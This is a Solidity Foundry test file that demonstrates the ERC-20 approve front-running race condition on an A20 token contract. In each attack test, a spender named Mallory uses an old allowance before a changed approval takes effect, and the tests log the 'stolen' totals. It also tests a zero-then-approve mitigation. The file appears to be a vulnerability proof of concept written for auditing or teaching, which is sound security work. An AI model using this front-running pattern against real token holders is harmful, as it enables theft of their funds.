// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {A20} from "src/ERC-20s/A20.sol";

contract A20Test is Test {
    A20 public token;
    address public alice;
    address public malloryTheSpender;

    function setUp() public {
        token = new A20();
        alice = makeAddr("alice");
        malloryTheSpender = makeAddr("mallory");

        deal(address(token), alice, 100000 * 10 ** 18);
    }

    function test_VulnerabilityProof_ReApproveAttack() public {
        uint256 initialApproval = 1000 * 10 ** 18;
        uint256 newApproval = 500 * 10 ** 18;
        uint256 aliceInitialBalance = token.balanceOf(alice);

        console.log("=== Re-Approve Attack Simulation ===");
        console.log("Alice initial balance:", aliceInitialBalance);

        vm.prank(alice);
        token.approve(malloryTheSpender, initialApproval);

        console.log("Step 1: Alice approved Mallory for", initialApproval);
        assertEq(token.allowance(alice, malloryTheSpender), initialApproval);

        vm.prank(malloryTheSpender);
        token.transferFrom(alice, malloryTheSpender, initialApproval);

        console.log("Step 2: Mallory front-runs and uses old approval");
        console.log("Mallory balance after first transfer:", token.balanceOf(malloryTheSpender));
        console.log("Alice balance after first transfer:", token.balanceOf(alice));

        vm.prank(alice);
        token.approve(malloryTheSpender, newApproval);

        console.log("Step 3: Alice's reduce approval transaction executes");
        assertEq(token.allowance(alice, malloryTheSpender), newApproval);

        vm.prank(malloryTheSpender);
        token.transferFrom(alice, malloryTheSpender, newApproval);

        console.log("Step 4: Mallory uses new approval as well");
        console.log("Final Mallory balance:", token.balanceOf(malloryTheSpender));
        console.log("Final Alice balance:", token.balanceOf(alice));

        // VULNERABILITY PROVEN: Mallory spent more than Alice ever intended
        uint256 totalSpentByMallory = token.balanceOf(malloryTheSpender);
        uint256 expectedMaxSpent = newApproval;

        console.log("VULNERABILITY PROVEN!");
        console.log("Total spent by Mallory:", totalSpentByMallory);
        console.log("Alice intended max spending:", expectedMaxSpent);
        console.log("Extra tokens stolen:", totalSpentByMallory - expectedMaxSpent);

        assertGt(totalSpentByMallory, expectedMaxSpent);
        assertEq(totalSpentByMallory, initialApproval + newApproval);
    }

    function test_WorseCase_IncreaseApproval() public {
        uint256 initialApproval = 1000 * 10 ** 18;
        uint256 increasedApproval = 2000 * 10 ** 18;

        console.log("=== Worse Case: Increasing Approval ===");

        // Alice initially approves 1000
        vm.prank(alice);
        token.approve(malloryTheSpender, initialApproval);

        vm.prank(malloryTheSpender);
        token.transferFrom(alice, malloryTheSpender, initialApproval);

        vm.prank(alice);
        token.approve(malloryTheSpender, increasedApproval);

        // Mallory spends the new amount too
        vm.prank(malloryTheSpender);
        token.transferFrom(alice, malloryTheSpender, increasedApproval);

        uint256 totalStolen = token.balanceOf(malloryTheSpender);
        console.log("In increase scenario, Mallory stole:", totalStolen);
        console.log("Alice intended to allow max:", increasedApproval);

        assertEq(totalStolen, initialApproval + increasedApproval);
        console.log("Mallory got both old and new approval amounts!");
    }

    function test_SafePattern_ZeroThenApprove() public {
        uint256 initialApproval = 1000 * 10 ** 18;
        uint256 newApproval = 500 * 10 ** 18;

        console.log("=== Safe Pattern: Zero Then Approve ===");

        vm.prank(alice);
        token.approve(malloryTheSpender, initialApproval);

        vm.prank(alice);
        token.approve(malloryTheSpender, 0);

        assertEq(token.allowance(alice, malloryTheSpender), 0);

        vm.prank(alice);
        token.approve(malloryTheSpender, newApproval);

        uint256 malloryBalanceBefore = token.balanceOf(malloryTheSpender);
        vm.prank(malloryTheSpender);
        token.transferFrom(alice, malloryTheSpender, newApproval);

        uint256 spentNow = token.balanceOf(malloryTheSpender) - malloryBalanceBefore;
        console.log("With safe pattern, spent after zero-then-approve:", spentNow);

        assertEq(spentNow, newApproval);
    }

    function test_IdealPattern_IncreaseDecreaseApproval() public {
        console.log("=== What Should Be Implemented ===");
        console.log("increaseApproval() and decreaseApproval() functions");
        console.log("These functions would be atomic and safe from re-approve attacks");
        console.log("But this token contract doesn't implement them!");

        assertTrue(true);
    }

    function test_MinimalFrontRunDemonstration() public {
        uint256 originalAmount = 100 * 10 ** 18;
        uint256 reducedAmount = 50 * 10 ** 18;

        vm.prank(alice);
        token.approve(malloryTheSpender, originalAmount);

        vm.startPrank(malloryTheSpender);

        token.transferFrom(alice, malloryTheSpender, originalAmount);

        vm.stopPrank();

        vm.prank(alice);
        token.approve(malloryTheSpender, reducedAmount);

        vm.prank(malloryTheSpender);
        token.transferFrom(alice, malloryTheSpender, reducedAmount);

        assertEq(token.balanceOf(malloryTheSpender), originalAmount + reducedAmount);
        console.log("Minimal demonstration: Attacker got both amounts");
    }
}
